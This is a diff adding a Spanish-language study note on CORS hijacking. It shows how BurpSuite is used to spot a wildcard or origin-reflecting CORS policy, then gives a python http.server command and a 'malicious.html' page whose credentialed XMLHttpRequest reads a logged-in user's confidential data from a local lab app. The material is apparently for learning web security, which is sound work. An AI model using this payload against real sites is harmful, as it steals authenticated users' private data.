@@ -13,5 +13,47 @@ El atacante podría utilizar herramientas automatizadas para probar diferentes v
 Para prevenir este tipo de ataque, es importante configurar adecuadamente CORS en la aplicación web y asegurarse de que solo se permitan solicitudes de origen cruzado desde dominios confiables.
 
 
-## CORS
+## CORS Hijacking
+
+Lo que hace CORS es hacer que dominios externos de paginas puedan realizar solicitudes para que puedan sustraer informacion de la pagina pero solo los que CORS decida.
+Puedes definir en la politica de CORS que dominios terceros queremos que unicamente puedan realizar solicitudes.
+
+
+Interceptaremos CORS con BurpSuite para ver su configuracion. 
+
+![](Pasted%20image%2020230522150453.png)
+
+Encontramos que esta mal configurado porque tiene un \*, esto nos indica que cualquier pagina puede hacer solicitud. 
+
+Podemos colocar en BurpSuite una nueva cabecera que se llame origin para mirar el comportamiento del servidor y vemos que en la respuesta nos regresa el valor de la cabecera origin. 
+
+![](Pasted%20image%2020230522151027.png)
+
+
+Debemos de estar autenticados en la web que tiene el CORS.
+![](Pasted%20image%2020230522151528.png)
+
+
+Ahora nos vamos a crear un recurso malicioso por el puerto 80 de nuestro equipo llamado 'malicious.html' y lo compartiremos con python. 
+```bash
+❯ python3 -m http.server 80
+```
+
+```html
+<Script>
+	var req = new XMLHttpRequest();
+	req.onload = reqListener;
+	req.open('GET', 'http://localhost:5000/confidential', true);
+	req.withCredentials = true;
+	req.send();
+
+	function reqListener(){
+			document.getElementById("stoleInfo").innerHTML = req.responseText;
+	}
+</Script>
+
+<center><h1>Has sido hackeado y esta es la info que he recopilado:</h1></center>
+
+<p id="stoleInfo"></p>
+```
 
